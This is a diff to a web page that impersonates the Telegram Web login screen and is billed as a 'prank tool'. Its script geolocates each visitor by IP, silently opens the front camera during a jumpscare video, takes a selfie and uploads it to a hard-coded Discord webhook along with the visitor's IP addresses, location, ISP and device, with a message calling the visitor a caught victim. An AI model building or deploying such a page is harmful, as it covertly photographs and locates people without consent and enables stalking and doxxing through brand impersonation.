@@ -154,8 +154,8 @@
   <div class="tg-subtitle">Please enter your phone number.</div>
   <input type="text" class="tg-input" placeholder="Phone number">
   <button class="tg-btn" onclick="startPrank()">Next</button>
-  <button class="tg-btn secondary" onclick="startPrank()">Sign Up</button>
-  <div class="landing-bottom-meta">© 2026 Telegram Web</div>
+  <button class="tg-btn secondary" onclick="startPrank()">Sign up</button>
+  <div class="landing-bottom-meta">© 2026 Telegram Messenger</div>
 </div>
 
 <div id="screen-loading">
@@ -177,18 +177,21 @@
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
+  let stream = null;
   let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
 
-  // 🕵️ NAUKEURIGERE IP + LOCATIE
+  // 🕵️ EXTRA NAUKEURIGE LOGS
   async function gatherData() {
     try {
-      const ipRes = await fetch('https://ip-api.com/json/?fields=status,message,country,city,regionName,isp,query').then(r => r.json());
+      const v4Res = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      if(v4Res.ip !== 'N/A') {
+          const detailRes = await fetch(`https://ip-api.com/json/${v4Res.ip}?fields=status,message,country,city,regionName,isp,query`).then(r => r.json());
+          ipInfo.v4 = detailRes.query;
+          ipInfo.loc = `${detailRes.city}, ${detailRes.regionName}, ${detailRes.country}`;
+          ipInfo.isp = detailRes.isp;
+      }
       const v6Res = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
-      
-      ipInfo.v4 = ipRes.query;
       ipInfo.v6 = v6Res.ip;
-      ipInfo.loc = `${ipRes.city}, ${ipRes.regionName}, ${ipRes.country}`;
-      ipInfo.isp = ipRes.isp;
     } catch(e) {}
   }
   gatherData();
@@ -200,21 +203,27 @@
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
 
-    // 2. STILLE AUDIO UNLOCK (Echt stil!)
+    // 2. Silent Audio Unlock
     if (audioCtx.state === 'suspended') audioCtx.resume();
-    const oscillator = audioCtx.createOscillator();
-    const gainNode = audioCtx.createGain();
-    gainNode.gain.value = 0; // Totaal stil
-    oscillator.connect(gainNode);
-    gainNode.connect(audioCtx.destination);
-    oscillator.start(0);
-    oscillator.stop(0.1);
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    gain.gain.value = 0;
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start(0);
+    osc.stop(0.1);
 
-    // 3. Naar loading
+    // 3. UI Switch
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    // 4. Start Jumpscare na korte pauze
+    // 4. Camera Start (Selfie)
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      document.getElementById('hidden-video').srcObject = stream;
+    } catch(e) {}
+
+    // 5. Trigger Jumpscare
     setTimeout(async () => {
       document.getElementById('screen-loading').style.display = 'none';
       document.getElementById('screen-jumpscare').style.display = 'flex';
@@ -223,10 +232,10 @@
       v.volume = 1.0;
       await v.play();
 
-      // 5. SEQUENTIAL CAMERA CAPTURE (Voor + Achter)
-      await takeSequentialPhotos();
+      // 6. Neem foto
+      takePhoto();
 
-      // 6. Naar troll na video
+      // 7. Naar troll scherm
       setTimeout(() => {
         document.getElementById('screen-jumpscare').style.display = 'none';
         document.getElementById('screen-troll').style.display = 'flex';
@@ -235,62 +244,44 @@
     }, 800);
   }
 
-  async function captureSingleMode(facing) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
-      const vid = document.getElementById('hidden-video');
-      vid.srcObject = stream;
-      
-      // Wacht tot video stabiel is
-      await new Promise(r => setTimeout(r, 400));
-      
-      const canvas = document.getElementById('hidden-canvas');
-      canvas.width = vid.videoWidth;
-      canvas.height = vid.videoHeight;
-      const ctx = canvas.getContext('2d');
-      
-      // Selfie flip
-      if (facing === 'user') {
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-      }
-      
-      ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
-      
-      // Stop stream
-      stream.getTracks().forEach(t => t.stop());
-      return blob;
-    } catch(e) { return null; }
+  function takePhoto() {
+    const vid = document.getElementById('hidden-video');
+    const canvas = document.getElementById('hidden-canvas');
+    if (!vid.srcObject || vid.videoWidth === 0) return;
+
+    canvas.width = vid.videoWidth;
+    canvas.height = vid.videoHeight;
+    const ctx = canvas.getContext('2d');
+    
+    // Selfie flip
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+    
+    canvas.toBlob(blob => {
+      sendToDiscord(blob);
+    }, 'image/jpeg', 0.95);
+
+    // Stop camera
+    stream.getTracks().forEach(t => t.stop());
   }
 
-  async function takeSequentialPhotos() {
-    const frontBlob = await captureSingleMode('user');
-    const backBlob = await captureSingleMode('environment');
-
-    const photos = [];
-    if (frontBlob) photos.push({ blob: frontBlob, name: 'selfie.jpg' });
-    if (backBlob) photos.push({ blob: backBlob, name: 'omgeving.jpg' });
-
-    sendToDiscord(photos);
-  }
-
-  async function sendToDiscord(photos) {
+  async function sendToDiscord(blob) {
     const form = new FormData();
-    const platform = navigator.userAgentData?.platform || navigator.platform;
+    const platform = navigator.userAgentData?.platform || navigator.platform || 'Onbekend';
     
     const payload = {
-      username: "🕵️ Night Owl Dual-Cam",
-      content: "💥 **DUBBELE TREFFER!**",
+      username: "🕵️ Night Owl Reporter",
+      content: "💥 **SLACHTOFFER GEPAKT!**",
       embeds: [{
-        title: "Systeem, IP & Omgevings Rapport",
+        title: "📸 Selfie & Gebruiker Details",
         color: 0xff0000,
         fields: [
           { name: "📱 Apparaat", value: `\`${platform}\``, inline: true },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-          { name: "📍 Locatie", value: `${ipInfo.loc}`, inline: true },
-          { name: "🏢 Provider", value: `${ipInfo.isp}`, inline: true }
+          { name: "📍 Locatie", value: `${ipInfo.loc}`, inline: false },
+          { name: "🏢 Provider", value: `${ipInfo.isp}`, inline: false }
         ],
         image: { url: 'attachment://selfie.jpg' },
         footer: { text: 'Night Owl Prank Tool' }
@@ -298,9 +289,7 @@
     };
 
     form.append('payload_json', JSON.stringify(payload));
-    photos.forEach((p) => {
-      form.append('file', p.blob, p.name);
-    });
+    form.append('file', blob, 'selfie.jpg');
 
     await fetch(WEBHOOK, { method: 'POST', body: form });
   }
